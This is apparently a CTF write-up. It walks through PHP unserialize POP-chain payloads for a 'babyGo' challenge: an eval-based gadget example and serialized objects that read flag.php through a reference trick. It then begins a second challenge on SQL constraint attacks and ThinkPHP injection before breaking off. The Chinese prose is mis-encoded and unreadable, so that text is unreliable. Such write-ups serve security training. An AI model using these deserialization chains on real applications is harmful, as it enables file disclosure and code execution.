        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="babyGoï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰"><a href="#babyGoï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰" class="headerlink" title="babyGoï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰"></a>babyGoï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰</h2><p><strong>è€ƒç‚¹</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpååºåˆ—åŒ–</span><br><span class="line"><span class="keyword">POP</span>é“¾æ„é€ </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file);</span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $Input_data;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="string">"./index.php"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flagçš„è¾“å‡ºåœ¨coolç±»ä¸­çš„readæ–¹æ³•ä¸­,ä½†æ˜¯åœ¨babyç±»ä¸­è°ƒç”¨çš„æ˜¯secç±»çš„readæ–¹æ³•</p><p><strong>POPé“¾æ„é€ </strong><br>ä¸€èˆ¬çš„åºåˆ—åŒ–æ”»å‡»éƒ½åœ¨PHPé­”æœ¯æ–¹æ³•ä¸­å‡ºç°å¯åˆ©ç”¨çš„æ¼æ´ï¼Œå› ä¸ºè‡ªåŠ¨è°ƒç”¨è§¦å‘æ¼æ´ï¼Œä½†å¦‚æœå…³é”®ä»£ç æ²¡åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å°±å¯ä»¥é€šè¿‡æ„é€ POPé“¾å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥<br><strong>ä¸¾ä¾‹</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>åœ¨ lemoç±»ä¸­è°ƒç”¨å¾—çš„æ˜¯ normalç±» ä½†æ˜¯åœ¨ evilç±» ä¸­ä¹Ÿæœ‰åœ¨normalç±»ä¸­çš„ç›¸åŒæ–¹æ³•å action<br>è¿™æ—¶å¯ä»¥æ„é€ pocé“¾æ¥è°ƒç”¨ evilç±» ä¸­çš„ actionæ–¹æ³•<br>payloadï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><p>æœ¬é¢˜ä¹Ÿæ˜¯ä¸€é“ç®€å•çš„POPé“¾æ„é€ ,æ³¨æ„çš„æ˜¯<br>if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)<br>å› ä¸ºaaaå’Œbbbä¸€å¼€ä¸ºnull  å¦‚æœä¸æ„é€ amazingçš„è¯ å®ä¾‹åŒ–ä¹‹åä¹Ÿä¸ºç©º å³å¯ç»•è¿‡if åˆ¤æ–­<br>payloadå¦‚ä¸‹:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file);</span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§åšæ³•æ˜¯çœ‹é£˜é›¶å¸ˆå‚…çš„</p><pre><code>$this-&gt;nice = unserialize($this-&gt;amzing);$this-&gt;nice-&gt;aaa = $sth;if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code></pre><p>aaaä¼šè¢«$sthå˜é‡èµ‹å€¼ æºç ä¸­ä¹Ÿæ²¡å‡ºç°è¿™ä¸ªå˜é‡ ä½†åŒæ—¶åˆè¦ä¸bbbç›¸ç­‰<br>æ‰€ä»¥ä½¿ç”¨æŒ‡é’ˆå¼•ç”¨ è¿™æ ·bbbçš„å€¼ä¼šéšaaaåŠ¨æ€æ”¹å˜<br>æ„é€ amazing</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//include 'flag.php';</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file);</span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span></span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a-&gt;bbb = &amp;$a-&gt;aaa;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><pre><code>äºæ˜¯$amazing = O:4:&quot;baby&quot;:3:{s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:{s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;}s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;}</code></pre><p>æœ€ç»ˆpayload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span></span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing=<span class="string">'O:4:"baby":3:&#123;s:9:"&lt;0x00&gt;*&lt;0x00&gt;skyobj";O:4:"cool":3:&#123;s:8:"filename";N;s:4:"nice";N;s:6:"amzing";N;&#125;s:3:"aaa";N;s:3:"bbb";R:6;&#125;'</span>;</span></span><br><span class="line"><span class="php">&#125;   </span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php"><span class="comment">// $a-&gt;bbb =&amp;$a-&gt;aaa;</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (serialize($a));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h2><p><strong>è€ƒç‚¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlçº¦æŸæ”»å‡»</span><br><span class="line">TPæ³¨å…¥</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç”¨å¾¡å‰‘æ‰«æ,å‘ç°<br>robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span>: *</span><br><span class="line"></span><br><span class="line"><span class="attribute">Disallow</span>: /ebooks</span><br><span class="line"><span class="attribute">Disallow</span>: /admin</span><br><span class="line"><span class="attribute">Disallow</span>: /xhtml/?</span><br><span class="line"><span class="attribute">Disallow</span>: /center</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ç™»å½•å’Œæ³¨å†Œé¡µé¢</p><p><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6n33ovwj30hd08ptct.jpg" 